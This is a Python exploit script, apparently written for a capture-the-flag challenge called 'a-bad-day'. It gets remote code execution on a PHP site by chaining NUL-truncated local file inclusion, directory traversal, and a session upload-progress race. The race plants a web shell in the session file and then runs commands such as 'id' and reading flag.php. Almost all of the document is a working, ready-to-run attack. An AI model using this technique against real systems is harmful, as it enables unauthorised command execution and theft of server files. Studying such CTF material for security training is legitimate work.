"""a-bad-day RCE via PHP session upload progress + NUL-truncated LFI.

Mechanism:
  include($_GET['category'] . '.php') with PHP NUL truncation -> we can include
  any file by ending the value with %00. Value must contain 'woofers' token.
  We use woofers/../../../.. to escape the webroot.

Steps:
  1. Sanity: include /etc/hostname via woofers traversal.
  2. Start a slow multipart upload carrying PHP code in the
     PHP_SESSION_UPLOAD_PROGRESS field -> PHP writes it into the session file.
  3. While upload is in flight, include candidate session paths; the embedded
     PHP executes -> RCE.
"""
import http.client
import re
import threading
import time
import uuid

HOST = "noctf.fa1lsnow.com"
PORT = 40547
SID = "coordinator0123456789abcd"  # 26 chars, valid charset
MARK = "PWNED_MARKER_42"
PHP_CODE = "<?php echo '" + MARK + "'; system($_GET['c']); ?>"
UP = "woofers/../../../../../../"

SESSION_PATHS = [
    "/tmp/sess_" + SID,
    "/var/lib/php/sessions/sess_" + SID,
    "/var/lib/php5/sess_" + SID,
    "/var/lib/php/sess_" + SID,
    "/dev/shm/sess_" + SID,
    "/var/www/html/sess_" + SID,
]


def http_get(path, timeout=8):
    conn = http.client.HTTPConnection(HOST, PORT, timeout=timeout)
    try:
        conn.request("GET", path, headers={"User-Agent": "probe"})
        r = conn.getresponse()
        return r.status, r.read()
    except Exception as e:  # noqa: BLE001
        return "ERR", repr(e).encode()
    finally:
        conn.close()


def section(body):
    if not isinstance(body, bytes):
        return ""
    txt = body.decode("utf-8", "replace")
    m = re.search(r'<div class="page-include">(.*?)</div>', txt, re.S)
    return re.sub(r"\s+", " ", m.group(1)).strip()[:400] if m else ""


def sanity():
    st, body = http_get("/index.php?category=" + UP + "etc/hostname%00")
    print("sanity /etc/hostname:", st, "| section:", section(body)[:120])
    return st


def slow_upload(stop_evt, total=8 * 1024 * 1024, chunk=16384, delay=0.05):
    boundary = "----probe" + uuid.uuid4().hex
    head = (
        f"--{boundary}\r\nContent-Disposition: form-data; name=\"PHP_SESSION_UPLOAD_PROGRESS\"\r\n\r\n{PHP_CODE}\r\n"
        f"--{boundary}\r\nContent-Disposition: form-data; name=\"f\"; filename=\"a.bin\"\r\n"
        f"Content-Type: application/octet-stream\r\n\r\n"
    ).encode()
    tail = f"\r\n--{boundary}--\r\n".encode()
    body_len = len(head) + total + len(tail)

    conn = http.client.HTTPConnection(HOST, PORT, timeout=120)
    try:
        conn.putrequest("POST", "/index.php")
        conn.putheader("Content-Type", f"multipart/form-data; boundary={boundary}")
        conn.putheader("Content-Length", str(body_len))
        conn.putheader("Cookie", f"PHPSESSID={SID}")
        conn.putheader("User-Agent", "probe")
        conn.endheaders()
        conn.send(head)
        sent = 0
        blob = b"B" * chunk
        while sent < total and not stop_evt.is_set():
            conn.send(blob)
            sent += chunk
            time.sleep(delay)
        conn.send(tail)
        try:
            r = conn.getresponse()
            r.read()
        except Exception:  # noqa: BLE001
            pass
    except Exception as e:  # noqa: BLE001
        print("upload thread error:", repr(e))
    finally:
        conn.close()


def main():
    sanity()
    stop = threading.Event()
    t = threading.Thread(target=slow_upload, args=(stop,), daemon=True)
    t.start()

    deadline = time.time() + 45
    found = None
    while time.time() < deadline and found is None:
        for sp in SESSION_PATHS:
            st, body = http_get("/index.php?category=" + UP + sp.lstrip("/") + "%00&c=id")
            sec = section(body)
            raw = body.decode("utf-8", "replace") if isinstance(body, bytes) else str(body)
            if MARK in raw or "upload_progress" in raw or "uid=" in sec:
                found = (sp, st, sec[:600])
                break
        if found:
            break
        time.sleep(0.5)

    stop.set()
    if found:
        print("*** SESSION FILE FOUND:", found[0], "status", found[1])
        print("*** SECTION:", found[2])
        # Now run the flag read with command execution
        st, body = http_get("/index.php?category=" + UP + found[0].lstrip("/") + "%00&c=cat /var/www/html/flag.php")
        print("=== flag.php source attempt:", st)
        print(section(body)[:3000])
    else:
        print("session file not found; last section samples:")
        for sp in SESSION_PATHS:
            st, body = http_get("/index.php?category=" + UP + sp.lstrip("/") + "%00")
            print(" ", sp, st, "->", section(body)[:150])


if __name__ == "__main__":
    main()
